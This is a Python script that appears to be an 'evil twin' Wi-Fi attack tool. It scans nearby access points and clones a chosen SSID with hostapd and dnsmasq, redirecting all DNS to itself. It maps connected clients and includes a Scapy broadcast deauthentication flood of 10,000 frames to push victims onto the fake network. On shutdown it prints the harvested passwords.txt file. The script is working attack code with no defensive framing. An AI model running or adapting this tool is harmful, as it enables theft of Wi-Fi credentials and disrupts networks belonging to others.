import ifcfg
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth
from scapy.layers.l2 import ARP, Ether
from wifi import Cell, Scheme
from scapy.all import *
import yaml
import datetime
import io

#Shows available devices
def chooseDevice():
    devicesName = []
    for name, interface in ifcfg.interfaces().items():
        # print(interface['name'])         # First IPv4 found
        # print(interface['inet4'])        # List of ips
        # print(interface['inet6'])
        # print(interface['netmask'])
        # print(interface['broadcast'])
        devicesName.append(interface['device'])
    # print("Choose interface: ")
    count = 1
    for device in devicesName:
        print(str(count) + '.' + device)
        count += 1

    choice = int(input());
    attDevice = devicesName[choice - 1]
    return attDevice

#print the AP (SSID, MAC, Signal)
def printAP(interface):
    devices = []
    aps = (list(Cell.all(interface)))
    print('\033[91m' + "   SSID             ADDRESS              SIGNAL")
    count = 1
    for ap in aps:
        devices.append(ap)
        ap_ssid = ap.ssid[:15]
        if len(ap_ssid) < 15:
            ap_ssid += ' ' * (15 - len(ap_ssid))
        ap_address = ap.address #size 17
        print('\033[94m' + str(count) + '. ' + '\033[94m' + ap_ssid + "  " + ap_address+"    " + str(ap.signal))
        count += 1
    return devices


def goMonitorMode(attDevice):
    os.system("sudo -S ifconfig " + attDevice + " down")
    os.system("sudo -S iwconfig " + attDevice + " mode monitor")
    os.system("sudo -S ifconfig " + attDevice + " up")
    print(attDevice + " is now in monitor mode!")

#Checking option permission
def checkFotRoot():
    if not os.geteuid() == 0:
        sys.exit("\nOnly root can run this script\n")


def apRescanHandler(interface):
    print("\n\n\n=================\nScanned APs\n=================")
    devices = (list(printAP(interface)))
    attSsid = input("\nChoose your attack AP or \"R\" fore rescan: ")
    while attSsid == "R" or attSsid == "r":
        devices = (list(printAP(interface)))
        attSsid = input("\nChoose your attack AP or \"R\" fore rescan: ")
    return [devices[int(attSsid) - 1].ssid, devices[int(attSsid) - 1].address]

def startAP(ssid, interface):
    # Remove and create dnsmasq.conf
    os.remove("dnsmasq.conf")
    f = open("dnsmasq.conf", "a")
    dnsmasq_conf = "interface=" + interface + "\ndhcp-range=10.0.0.10,10.0.0.100,8h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1"

    # Remove and create hostapd.conf
    os.remove("hostapd.conf")
    s = open("hostapd.conf", "a")
    hostapd_conf = "interface=" + interface + "\nssid=" + ssid + "\nchannel=1\ndriver=nl80211"

    f.write(dnsmasq_conf)
    s.write(hostapd_conf)
    f.close()
    s.close()

    os.system("sudo bash fake-ap-start.sh")

def stopAttack():
    print("Stopping attack..")
    os.system("sudo bash fake-ap-stop.sh")
    f = open("/srv/http/passwords.txt")
    print(f.read())


def deauth(brdmac, addr):
    print("\nChoose interface for deauth attack")
    interface = chooseDevice()
    goMonitorMode(interface)
    pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = addr, addr3 = addr) / Dot11Deauth()
    sendp(pkt, iface=interface, count=10000, inter=.2)

class AP:
    def __init__(self, ssid, bssid):
        self.ssid = ssid
        self.bssid = bssid
        self.connectedDevices = []

    def addDevice(self, device):
        self.connectedDevices.append(device)

class Device:
    def __init__(self, bssid, signal, vendor):
        self.bssid = bssid
        self.signal = signal
        self.vendor = vendor

def printDevices(ssid):
    stream = open("wifi_map.yaml", 'r')
    docs = yaml.load_all(stream)

    myAP = ssid

    for doc in docs:
        for name, v in doc.items():
            if myAP == name:
                # print(k, "->", v)
                apSsid = name
                other = v

    for o, v in other.items():
        apBssid = o
        devices = v["devices"]

    ap = AP(apSsid, apBssid)

    for bssid, other in devices.items():
        device = Device(bssid, other['signal'], other['vendor'])
        ap.addDevice(device)
    print("\n\n\n ")
    print("===============================\nDevices connected to " + ssid + "\n===============================")
    print("\033[91mAP ssid: " + apSsid + "\nAP bssid: " + ap.bssid)
    print("Connected divices list:\n")
    print("\033[94mSSID                  SIGNAL    VENDOR")
    for device in ap.connectedDevices:
        print(device.bssid + "     " + str(device.signal) + "       " + device.vendor)
    os.system("rm wifi_map.yaml")
    print("\n\n\n")
    return ap
if __name__ == "__main__":
    checkFotRoot()
    apDevice = chooseDevice()
    ap = apRescanHandler(apDevice)
    ssid = ap[0]
    addr = ap[1]
    # startAP(ssid, apDevice)
    os.system("rm wifi_map.yaml")
    os.system('trackerjacker -i ' + apDevice + ' --map')
    printDevices(ssid)
    brdmac = "ff:ff:ff:ff:ff:ff"
    # deauth(brdmac, addr)
    stopAttack()